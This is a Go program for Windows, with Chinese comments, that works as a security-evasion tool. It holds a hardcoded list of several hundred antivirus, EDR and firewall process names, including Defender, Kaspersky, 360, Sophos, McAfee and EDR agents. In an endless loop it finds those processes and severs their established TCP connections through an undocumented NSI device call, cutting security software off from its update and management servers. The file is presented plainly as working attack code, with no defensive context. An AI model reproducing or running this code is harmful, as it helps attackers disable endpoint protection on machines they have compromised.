package main

import (
	"fmt"
	"net"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

// 常量定义
const (
	INVALID_HANDLE_VALUE      = ^uintptr(0)
	FILE_ATTRIBUTE_NORMAL     = 0x80
	FILE_SHARE_READ           = 0x00000001
	FILE_SHARE_WRITE          = 0x00000002
	OPEN_EXISTING             = 3
	GENERIC_READ              = 0x80000000
	GENERIC_WRITE             = 0x40000000
	AF_INET                   = 2
	ERROR_INSUFFICIENT_BUFFER = 122
	NO_ERROR                  = 0
	MIB_TCP_STATE_ESTAB       = 5
	MIB_TCP_STATE_DELETE_TCB  = 12
)

// TCP模块ID
var NPI_MS_TCP_MODULEID = []byte{
	0x18, 0x00, 0x00, 0x00, 0x01, 0x00, 0x00, 0x00,
	0x03, 0x4A, 0x00, 0xEB, 0x1A, 0x9B, 0xD4, 0x11,
	0x91, 0x23, 0x00, 0x50, 0x04, 0x77, 0x59, 0xBC,
}

// 结构体定义
type IO_STATUS_BLOCK struct {
	Status      uint32
	Information uint64
}

type NSI_SET_PARAMETERS_EX struct {
	Reserved0        uintptr
	Reserved1        uintptr
	ModuleId         uintptr
	IoCode           uint32
	Unused1          uint32
	Param1           uint32
	Param2           uint32
	InputBuffer      uintptr
	InputBufferSize  uint32
	Unused2          uint32
	MetricBuffer     uintptr
	MetricBufferSize uint32
	Unused3          uint32
}

type TcpKillParamsIPv4 struct {
	LocalAddrFamily  uint16
	LocalPort        uint16
	LocalAddr        uint32
	Reserved1        [20]byte
	RemoteAddrFamily uint16
	RemotePort       uint16
	RemoteAddr       uint32
	Reserved2        [20]byte
}

type MIB_TCPROW2 struct {
	State        uint32
	LocalAddr    uint32
	LocalPort    uint32
	RemoteAddr   uint32
	RemotePort   uint32
	OwningPid    uint32
	OffloadState uint32
}

type MIB_TCPTABLE2 struct {
	NumEntries uint32
	Table      []MIB_TCPROW2
}

var (
	ntdll    = windows.NewLazySystemDLL("ntdll.dll")
	kernel32 = windows.NewLazySystemDLL("kernel32.dll")
	iphlpapi = windows.NewLazySystemDLL("iphlpapi.dll")

	procNtDeviceIoControlFile = ntdll.NewProc("NtDeviceIoControlFile")
	procCreateFileW           = kernel32.NewProc("CreateFileW")
	procDeviceIoControl       = kernel32.NewProc("DeviceIoControl")
	procCloseHandle           = kernel32.NewProc("CloseHandle")
	procGetTcpTable2          = iphlpapi.NewProc("GetTcpTable2")
)

func errorToUint32(err error) uint32 {
	if err == nil {
		return 0
	}
	if errno, ok := err.(syscall.Errno); ok {
		return uint32(errno)
	}
	return uint32(syscall.EINVAL)
}

func MyNsiSetAllParameters(a1, a2 uint32, pModuleId []byte, dwIoCode uint32, pInputBuffer interface{}) uint32 {
	// 打开NSI设备
	deviceName, _ := syscall.UTF16PtrFromString("\\\\.\\Nsi")
	hDevice, _, _ := procCreateFileW.Call(
		uintptr(unsafe.Pointer(deviceName)),
		uintptr(GENERIC_READ|GENERIC_WRITE),
		uintptr(FILE_SHARE_READ|FILE_SHARE_WRITE),
		0,
		uintptr(OPEN_EXISTING),
		uintptr(FILE_ATTRIBUTE_NORMAL),
		0,
	)

	if hDevice == INVALID_HANDLE_VALUE {
		return errorToUint32(syscall.GetLastError())
	}
	defer procCloseHandle.Call(hDevice)

	params := NSI_SET_PARAMETERS_EX{
		ModuleId:        uintptr(unsafe.Pointer(&pModuleId[0])),
		IoCode:          dwIoCode,
		Param1:          a1,
		Param2:          a2,
		InputBuffer:     uintptr(unsafe.Pointer(&pInputBuffer)),
		InputBufferSize: uint32(unsafe.Sizeof(pInputBuffer)),
	}

	hEvent, err := windows.CreateEvent(nil, 0, 0, nil)
	if err != nil {
		return errorToUint32(err)
	}
	defer windows.CloseHandle(hEvent)

	// 准备IO状态块
	var ioStatusBlock IO_STATUS_BLOCK

	ret, _, _ := procNtDeviceIoControlFile.Call(
		hDevice,
		uintptr(hEvent),
		0,
		0,
		uintptr(unsafe.Pointer(&ioStatusBlock)),
		0x120013, // IOCTL code
		uintptr(unsafe.Pointer(&params)),
		uintptr(unsafe.Sizeof(params)),
		uintptr(unsafe.Pointer(&params)),
		uintptr(unsafe.Sizeof(params)),
	)

	// 检查返回值
	if ret != 0 {
		if ret == 0x103 { // STATUS_PENDING
			// 等待操作完成
			_, err := windows.WaitForSingleObject(hEvent, windows.INFINITE)
			if err != nil {
				return errorToUint32(err)
			}
			ret = uintptr(ioStatusBlock.Status)
		}
	}
	if ret != 0 {
		return errorToUint32(syscall.GetLastError())
	}

	return 0
}
func GetTcpTable2(table *MIB_TCPTABLE2, size *uint32, order bool) error {
	ret, _, _ := procGetTcpTable2.Call(
		uintptr(unsafe.Pointer(table)),
		uintptr(unsafe.Pointer(size)),
		uintptr(boolToUintptr(order)),
	)
	if ret != 0 {
		return syscall.Errno(ret)
	}
	return nil
}
func boolToUintptr(b bool) uintptr {
	if b {
		return 1
	}
	return 0
}

func CloseTcpConnectionsByPid(pid uint32) {
	var size uint32
	if err := GetTcpTable2(nil, &size, true); err != syscall.ERROR_INSUFFICIENT_BUFFER {
		fmt.Printf("[!] Failed to query TCP table size: %v\n", err)
		return
	}

	tcpTable := make([]byte, size)
	if err := GetTcpTable2((*MIB_TCPTABLE2)(unsafe.Pointer(&tcpTable[0])), &size, true); err != nil {
		fmt.Printf("[!] Failed to get TCP table: %v\n", err)
		return
	}

	// 获取表头
	table := (*MIB_TCPTABLE2)(unsafe.Pointer(&tcpTable[0]))

	numEntries := table.NumEntries
	if numEntries == 0 {
		return
	}

	rows := make([]MIB_TCPROW2, numEntries)

	rowSize := unsafe.Sizeof(MIB_TCPROW2{})
	for i := uint32(0); i < numEntries; i++ {
		rowPtr := unsafe.Pointer(uintptr(unsafe.Pointer(&tcpTable[0])) + unsafe.Sizeof(uint32(0)) + uintptr(i)*rowSize)
		rows[i] = *(*MIB_TCPROW2)(rowPtr)
	}

	closedCount := 0
	for _, row := range rows {
		if row.OwningPid == pid && row.State == MIB_TCP_STATE_ESTAB {
			// 准备关闭连接的参数
			params := TcpKillParamsIPv4{
				LocalAddrFamily:  AF_INET,
				LocalPort:        uint16(row.LocalPort),
				LocalAddr:        row.LocalAddr,
				RemoteAddrFamily: AF_INET,
				RemotePort:       uint16(row.RemotePort),
				RemoteAddr:       row.RemoteAddr,
			}

			// 调用NSI API关闭连接
			result := MyNsiSetAllParameters(1, 2, NPI_MS_TCP_MODULEID, 16, params)
			if result == NO_ERROR {
				closedCount++
				localAddr := net.IP{byte(row.LocalAddr), byte(row.LocalAddr >> 8), byte(row.LocalAddr >> 16), byte(row.LocalAddr >> 24)}
				remoteAddr := net.IP{byte(row.RemoteAddr), byte(row.RemoteAddr >> 8), byte(row.RemoteAddr >> 16), byte(row.RemoteAddr >> 24)}
				fmt.Printf("    [-] Closed TCP connection: %s:%d -> %s:%d\n",
					localAddr.String(), ntohs(uint16(row.LocalPort)),
					remoteAddr.String(), ntohs(uint16(row.RemotePort)))
			} else {
				fmt.Printf("    [!] Failed to close connection. Error code: %d\n", result)
			}
		}
	}

	if closedCount > 0 {
		fmt.Printf("[=] Closed %d connections for PID %d\n", closedCount, pid)
	}
}

// 辅助函数：网络字节序转换
func ntohs(port uint16) uint16 {
	return (port << 8) | (port >> 8)
}

// 获取进程PID列表
func GetPidsByProcessName(processName string) []uint32 {
	var pids []uint32
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		fmt.Printf("[!] CreateToolhelp32Snapshot failed: %v\n", err)
		return pids
	}
	defer windows.CloseHandle(snapshot)

	var pe32 windows.ProcessEntry32
	pe32.Size = uint32(unsafe.Sizeof(pe32))

	if err := windows.Process32First(snapshot, &pe32); err != nil {
		fmt.Printf("[!] Process32First failed: %v\n", err)
		return pids
	}

	for {
		if windows.UTF16ToString(pe32.ExeFile[:]) == processName {
			pids = append(pids, pe32.ProcessID)
			fmt.Printf("[+] Found process: %s (PID: %d)\n", processName, pe32.ProcessID)
		}
		if err := windows.Process32Next(snapshot, &pe32); err != nil {
			break
		}
	}

	return pids
}

func main() {
	targetProcs := []string{
		"360tray.exe", "360safe.exe", "ZhuDongFangYu.exe", "360sd.exe", "a2guard.exe",
		"ad-watch.exe", "cleaner8.exe", "vba32lder.exe", "MongoosaGUI.exe",
		"CorantiControlCenter32.exe", "F-PROT.exe", "CMCTrayIcon.exe", "K7TSecurity.exe",
		"UnThreat.exe", "CKSoftShiedAntivirus4.exe", "AVWatchService.exe",
		"ArcaTasksService.exe", "iptray.exe", "PSafeSysTray.exe", "nspupsvc.exe",
		"SpywareTerminatorShield.exe", "BKavService.exe", "MsMpEng.exe", "SBAMSvc.exe",
		"ccSvcHst.exe", "f-secure.exe", "avp.exe", "KvMonXP.exe", "RavMonD.exe",
		"Mcshield.exe", "Tbmon.exe", "Frameworkservice.exe", "egui.exe", "ekrn.exe",
		"eguiProxy.exe", "kxetray.exe", "knsdtray.exe", "TMBMSRV.exe", "avcenter.exe",
		"avguard.exe", "avgnt.exe", "sched.exe", "ashDisp.exe", "rtvscan.exe",
		"ccapp.exe", "NPFMntor.exe", "ccSetMgr.exe", "ccRegVfy.exe", "ksafe.exe",
		"QQPCRTP.exe", "avgwdsvc.exe", "QUHLPSVC.exe", "mssecess.exe", "SavProgress.exe",
		"SophosUI.exe", "SophosFS.exe", "SophosHealth.exe", "SophosSafestore64.exe",
		"SophosCleanM.exe", "fsavgui.exe", "vsserv.exe", "remupd.exe", "FortiTray.exe",
		"safedog.exe", "parmor.exe", "Iparmor.exe.exe", "beikesan.exe", "KSWebShield.exe",
		"TrojanHunter.exe", "GG.exe", "adam.exe", "AST.exe", "ananwidget.exe",
		"AVK.exe", "avg.exe", "spidernt.exe", "avgaurd.exe", "vsmon.exe", "cpf.exe",
		"outpost.exe", "rfwmain.exe", "kpfwtray.exe", "FYFireWall.exe", "MPMon.exe",
		"pfw.exe", "BaiduSdSvc.exe", "BaiduSdTray.exe", "BaiduSd.exe",
		"SafeDogGuardCenter.exe", "safedogupdatecenter.exe", "safedogguardcenter.exe",
		"SafeDogSiteIIS.exe", "SafeDogTray.exe", "SafeDogServerUI.exe",
		"D_Safe_Manage.exe", "d_manage.exe", "yunsuo_agent_service.exe",
		"yunsuo_agent_daemon.exe", "HwsPanel.exe", "hws_ui.exe", "hws.exe", "hwsd.exe",
		"HipsTray.exe", "HipsDaemon.exe", "wsctrl.exe", "usysdiag.exe", "SPHINX.exe",
		"bddownloader.exe", "baiduansvx.exe", "AvastUI.exe", "emet_agent.exe",
		"emet_service.exe", "firesvc.exe", "firetray.exe", "hipsvc.exe", "mfevtps.exe",
		"mcafeefire.exe", "scan32.exe", "shstat.exe", "vstskmgr.exe", "engineserver.exe",
		"mfeann.exe", "mcscript.exe", "updaterui.exe", "udaterui.exe", "naprdmgr.exe",
		"cleanup.exe", "cmdagent.exe", "frminst.exe", "mcscript_inuse.exe", "mctray.exe",
		"_avp32.exe", "_avpcc.exe", "_avpm.exe", "aAvgApi.exe", "ackwin32.exe",
		"alertsvc.exe", "alogserv.exe", "anti-trojan.exe", "arr.exe", "atguard.exe",
		"atupdater.exe", "atwatch.exe", "au.exe", "aupdate.exe", "auto-protect.nav80try.exe",
		"autodown.exe", "avconsol.exe", "avgcc32.exe", "avgctrl.exe", "avgemc.exe",
		"avgrsx.exe", "avgserv.exe", "avgserv9.exe", "avgw.exe", "avkpop.exe",
		"avkserv.exe", "avkservice.exe", "avkwctl9.exe", "avltmain.exe", "avnt.exe",
		"avp32.exe", "avpcc.exe", "avpdos32.exe", "avpm.exe", "avptc32.exe",
		"avpupd.exe", "avsynmgr.exe", "avwin.exe", "bargains.exe", "beagle.exe",
		"blackd.exe", "blackice.exe", "blink.exe", "blss.exe", "bootwarn.exe",
		"bpc.exe", "brasil.exe", "ccevtmgr.exe", "cdp.exe", "cfd.exe", "cfgwiz.exe",
		"claw95.exe", "claw95cf.exe", "clean.exe", "cleaner.exe", "cleaner3.exe",
		"cleanpc.exe", "cpd.exe", "ctrl.exe", "cv.exe", "defalert.exe", "defscangui.exe",
		"defwatch.exe", "doors.exe", "dpf.exe", "dpps2.exe", "dssagent.exe",
		"ecengine.exe", "emsw.exe", "ent.exe", "espwatch.exe", "ethereal.exe",
		"exe.avxw.exe", "expert.exe", "f-prot95.exe", "fameh32.exe", "fast.exe",
		"fch32.exe", "fih32.exe", "findviru.exe", "firewall.exe", "fnrb32.exe",
		"fp-win.exe", "fsaa.exe", "fsav.exe", "fsav32.exe", "fsav530stbyb.exe",
		"fsav530wtbyb.exe", "fsav95.exe", "fsgk32.exe", "fsm32.exe", "fsma32.exe",
		"fsmb32.exe", "gbmenu.exe", "guard.exe", "guarddog.exe", "htlog.exe",
		"htpatch.exe", "hwpe.exe", "iamapp.exe", "iamserv.exe", "iamstats.exe",
		"iedriver.exe", "iface.exe", "infus.exe", "infwin.exe", "intdel.exe",
		"intren.exe", "jammer.exe", "kavpf.exe", "kazza.exe", "keenvalue.exe",
		"launcher.exe", "ldpro.exe", "ldscan.exe", "localnet.exe", "luall.exe",
		"luau.exe", "lucomserver.exe", "mcagent.exe", "mcmnhdlr.exe", "mctool.exe",
		"mcupdate.exe", "mcvsrte.exe", "mcvsshld.exe", "mfin32.exe", "mfw2en.exe",
		"mfweng3.02d30.exe", "mgavrtcl.exe", "mgavrte.exe", "mghtml.exe", "mgui.exe",
		"minilog.exe", "mmod.exe", "mostat.exe", "mpfagent.exe", "mpfservice.exe",
		"mpftray.exe", "mscache.exe", "mscman.exe", "msmgt.exe", "msvxd.exe",
		"mwatch.exe", "nav.exe", "navapsvc.exe", "navapw32.exe", "navw32.exe",
		"ndd32.exe", "neowatchlog.exe", "netutils.exe", "nisserv.exe", "nisum.exe",
		"nmain.exe", "nod32.exe", "norton_internet_secu_3.0_407.exe", "notstart.exe",
		"nprotect.exe", "npscheck.exe", "npssvc.exe", "ntrtscan.exe", "nui.exe",
		"otfix.exe", "outpostinstall.exe", "patch.exe", "pavw.exe", "pcscan.exe",
		"pdsetup.exe", "persfw.exe", "pgmonitr.exe", "pingscan.exe", "platin.exe",
		"pop3trap.exe", "poproxy.exe", "popscan.exe", "powerscan.exe", "ppinupdt.exe",
		"pptbc.exe", "ppvstop.exe", "prizesurfer.exe", "prmt.exe", "prmvr.exe",
		"processmonitor.exe", "proport.exe", "protectx.exe", "pspf.exe", "purge.exe",
		"qconsole.exe", "qserver.exe", "rapapp.exe", "rb32.exe", "rcsync.exe",
		"realmon.exe", "rescue.exe", "rescue32.exe", "rshell.exe", "rtvscn95.exe",
		"rulaunch.exe", "run32dll.exe", "safeweb.exe", "sbserv.exe", "scrscan.exe",
		"sfc.exe", "sh.exe", "showbehind.exe", "soap.exe", "sofi.exe", "sperm.exe",
		"supporter5.exe", "symproxysvc.exe", "symtray.exe", "tbscan.exe", "tc.exe",
		"titanin.exe", "tvmd.exe", "tvtmd.exe", "vettray.exe", "vir-help.exe",
		"vnpc3000.exe", "vpc32.exe", "vpc42.exe", "vshwin32.exe", "vsmain.exe",
		"vsstat.exe", "wfindv32.exe", "zapro.exe", "zonealarm.exe", "AVPM.exe",
		"A2CMD.exe", "A2SERVICE.exe", "A2FREE.exe", "ADVCHK.exe", "AGB.exe",
		"AHPROCMONSERVER.exe", "AIRDEFENSE.exe", "ALERTSVC.exe", "AVIRA.exe",
		"AMON.exe", "AVZ.exe", "ANTIVIR.exe", "APVXDWIN.exe", "ASHMAISV.exe",
		"ASHSERV.exe", "ASHSIMPL.exe", "ASHWEBSV.exe", "ASWUPDSV.exe", "ASWSCAN.exe",
		"AVCIMAN.exe", "AVCONSOL.exe", "AVENGINE.exe", "AVESVC.exe", "AVEVL32.exe",
		"AVGAM.exe", "AVGCC.exe", "AVGCHSVX.exe", "AVGCSRVX", "AVGNSX.exe",
		"AVGCC32.exe", "AVGCTRL.exe", "AVGEMC.exe", "AVGFWSRV.exe", "AVGNTMGR.exe",
		"AVGSERV.exe", "AVGTRAY.exe", "AVGUPSVC.exe", "AVINITNT.exe", "AVPCC.exe",
		"AVSERVER.exe", "AVSCHED32.exe", "AVSYNMGR.exe", "AVWUPSRV.exe", "BDSWITCH.exe",
		"BLACKD.exe", "CCEVTMGR.exe", "CFP.exe", "CLAMWIN.exe", "CUREIT.exe",
		"DEFWATCH.exe", "DRWADINS.exe", "DRWEB.exe", "DEFENDERDAEMON.exe",
		"EWIDOCTRL.exe", "EZANTIVIRUSREGISTRATIONCHECK.exe", "FIREWALL.exe",
		"FPROTTRAY.exe", "FPWIN.exe", "FRESHCLAM.exe", "FSAV32.exe", "FSBWSYS.exe",
		"FSDFWD.exe", "FSGK32.exe", "FSGK32ST.exe", "FSMA32.exe", "FSMB32.exe",
		"FSSM32.exe", "GUARDGUI.exe", "GUARDNT.exe", "IAMAPP.exe", "INOCIT.exe",
		"INORPC.exe", "INORT.exe", "INOTASK.exe", "INOUPTNG.exe", "ISAFE.exe",
		"KAV.exe", "KAVMM.exe", "KAVPF.exe", "KAVPFW.exe", "KAVSTART.exe",
		"KAVSVC.exe", "KAVSVCUI.exe", "KMAILMON.exe", "MCAGENT.exe", "MCMNHDLR.exe",
		"MCREGWIZ.exe", "MCUPDATE.exe", "MCVSSHLD.exe", "MINILOG.exe", "MYAGTSVC.exe",
		"MYAGTTRY.exe", "NAVAPSVC.exe", "NAVAPW32.exe", "NAVLU32.exe", "NAVW32.exe",
		"NEOWATCHLOG.exe", "NEOWATCHTRAY.exe", "NISSERV.exe", "NISUM.exe",
		"NMAIN.exe", "NOD32.exe", "NPFMSG.exe", "NPROTECT.exe", "NSMDTR.exe",
		"NTRTSCAN.exe", "OFCPFWSVC.exe", "ONLINENT.exe", "OP_MON.exe", "PAVFIRES.exe",
		"PAVFNSVR.exe", "PAVKRE.exe", "PAVPROT.exe", "PAVPROXY.exe", "PAVPRSRV.exe",
		"PAVSRV51.exe", "PAVSS.exe", "PCCGUIDE.exe", "PCCIOMON.exe", "PCCNTMON.exe",
		"PCCPFW.exe", "PCCTLCOM.exe", "PCTAV.exe", "PERSFW.exe", "PERVAC.exe",
		"PESTPATROL.exe", "PREVSRV.exe", "RTVSCN95.exe", "SAVADMINSERVICE.exe",
		"SAVMAIN.exe", "SAVSCAN.exe", "SDHELP.exe", "SHSTAT.exe", "SPBBCSVC.exe",
		"SPIDERCPL.exe", "SPIDERML.exe", "SPIDERUI.exe", "SPYBOTSD.exe", "SWAGENT.exe",
		"SWDOCTOR.exe", "SWNETSUP.exe", "SYMLCSVC.exe", "SYMPROXYSVC.exe",
		"SYMSPORT.exe", "SYMWSC.exe", "SYNMGR.exe", "TMLISTEN.exe", "TMNTSRV.exe",
		"TMPROXY.exe", "TNBUTIL.exe", "VBA32ECM.exe", "VBA32IFS.exe", "VBA32PP3.exe",
		"VCRMON.exe", "VRMONNT.exe", "VRMONSVC.exe", "VSHWIN32.exe", "VSSTAT.exe",
		"XCOMMSVR.exe", "ZONEALARM.exe", "360rp.exe", "afwServ.exe", "safeboxTray.exe",
		"360safebox.exe", "QQPCTray.exe", "KSafeTray.exe", "KSafeSvc.exe", "KWatch.exe",
		"gov_defence_service.exe", "gov_defence_daemon.exe", "smartscreen.exe",
		"macompatsvc.exe", "mcamnsvc.exe", "masvc.exe", "mfemms.exe", "mctary.exe",
		"mcshield.exe", "mfewc.exe", "mfewch.exe", "mfefw.exe", "mfefire.exe",
		"mfetp.exe", "mfecanary.exe", "mfeconsole.exe", "mfeesp.exe", "fcag.exe",
		"fcags.exe", "fcagswd.exe", "fcagate.exe", "360EntClient.exe", "edr_sec_plan.exe",
		"edr_monitor.exe", "edr_agent.exe", "ESCCControl.exe", "ESCC.exe", "ESAV.exe",
		"ESCCIndex.exe", "AliYunDun.exe", "wdswfsafe.exe",
	}

	fmt.Println("[*] Starting connection monitor...")
	fmt.Printf("[*] Monitoring %d processes\n", len(targetProcs))

	for {
		for _, procName := range targetProcs {
			pids := GetPidsByProcessName(procName)
			for _, pid := range pids {
				CloseTcpConnectionsByPid(pid)
			}
		}
	}
}
